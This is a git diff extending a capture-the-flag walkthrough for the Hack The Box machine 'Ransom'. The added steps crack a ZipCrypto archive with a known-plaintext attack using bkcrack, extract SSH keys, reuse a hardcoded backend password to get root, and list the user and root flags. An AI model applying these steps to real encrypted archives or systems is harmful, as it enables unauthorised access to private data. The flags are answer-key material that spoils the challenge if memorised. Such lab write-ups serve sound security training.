@@ -61,12 +61,9 @@ Content-Length: 18
 { "password":true}
 ````
 
-The web page has the first flag
-http://ransom.htb/user.txt
+The web page has the first flag http://ransom.htb/user.txt, and also a encrypted zip archive (http://ransom.htb/uploaded-file-3422.zip)
 
-And also has a zip archive (http://ransom.htb/uploaded-file-3422.zip)
-
-7zip/7-zip has a technical mode to show more information from a file that can be used to discover the criptography used to cipher the archive.
+7zip/7-zip has a technical mode to show more information from a file that can be used to discover the mechanism used to cipher the archive.
 
 ````
 # 7z l -slt uploaded-file-3422.zip 
@@ -101,12 +98,106 @@ Host OS = Unix
 Version = 20
 Volume Index = 0
 ````
+
+The ZipCrypto Deflate is vulnerable to [known plaintext attack](https://en.wikipedia.org/wiki/Known-plaintext_attack). The attack can be made with [bkcrack](https://github.com/kimci86/bkcrack) the only thing you need is a entire file that matches the CRC from the encrypted archive. The 7zip CRC value is the value of the uncompressed file.
+  
+````python
+import binascii
+with open('file_blah', 'wb') as f:
+  data = b'# ~/.bash_logout: executed by bash(1) when login shell exits.\n\n# when leaving the console clear the screen to increase privacy\n\nif [ "$SHLVL" = 1 ]; then\n    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q\nfi\n'
+  f.write(data)
+  hex(binascii.crc32(data) & 0xFFFFFFFF)  
+````
+
+  bkcrack options:
+  ````
+  -C: the encrypted zip file
+  -c: the name of the encrypted but known file in the zip
+  -P: an unencrypted zip with the file in it
+  -p: the name of the file in the unencrypted zip
+  ````
+  
+  ````
+  $ bkcrack -C uploaded-file-3422.zip -c .bash_logout -P file_blah.zip -p file_blah
+  bkcrack 1.3.5 - 2022-03-06
+  [07:39:49] Z reduction using 150 bytes of known plaintext
+  0.0 % (0 / 150) 
+  100.0 % (150 / 150)
+  [07:39:50] Attack on 57097 Z values at index 7
+  Keys: 7b549874 ebc25ec5 7e465e18
+  78.5 % (44845 / 57097)
+  [07:44:34] Keys
+  7b549874 ebc25ec5 7e465e18
+  ````
+
+   bkcrack options 2:
+  ````
+    -C: encrypted archive
+    -k: keys from above
+    -U: output archive name
+    password: output archive password (new password to decompress the file)
+  ````
+  
+  ````
+   /opt/bkcrack-1.3.5-Linux/bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U output.zip passwd
+    bkcrack 1.3.5 - 2022-03-06
+    [08:05:45] Writing unlocked archive output.zip with password "passwd"
+    100.0 % (9 / 9)
+    Wrote unlocked archive
+  ````
+  
+  ````
+  # unzip output.zip -d output_files        <PASSWORD: passwd>
+Archive:  output.zip
+[output.zip] .bash_logout password: 
+  inflating: output_files/.bash_logout  
+  inflating: output_files/.bashrc    
+  inflating: output_files/.profile   
+   creating: output_files/.cache/
+ extracting: output_files/.cache/motd.legal-displayed  
+ extracting: output_files/.sudo_as_admin_successful  
+   creating: output_files/.ssh/
+  inflating: output_files/.ssh/id_rsa  
+  inflating: output_files/.ssh/authorized_keys  
+  inflating: output_files/.ssh/id_rsa.pub  
+  inflating: output_files/.viminfo
+  ````
   
 # Root
+  
+  Root password is the one used to check the first login page, it is cleartext written in the source code of the backend.
+  ````php
+      /**
+     * Handle account login
+     * 
+     */
+    public function customLogin(Request $request)
+    {
+        $request->validate([
+            'password' => 'required',
+        ]);
 
+        if ($request->get('password') == "UHC-March-Global-PW!") {
+            session(['loggedin' => True]);
+            return "Login Successful";
+        }
+
+        return "Invalid Password";
+    }
+  ````
+
+  ````
+  htb@ransom:~$ su - root
+Password: 
+root@ransom:~# ls
+root.txt
+root@ransom:~# cat root.txt 
+6d197387cb7f92184565cbe7850ee013
+  ````
+  
 # Secrets
   
   * FLAG_USER = 34b36fdef7651ea726d6dd00d83678cb
-  * FLAG_ROOT = 
+  * FLAG_ROOT = 6d197387cb7f92184565cbe7850ee013
   
 https://0xdf.gitlab.io/2022/03/15/htb-ransom.html
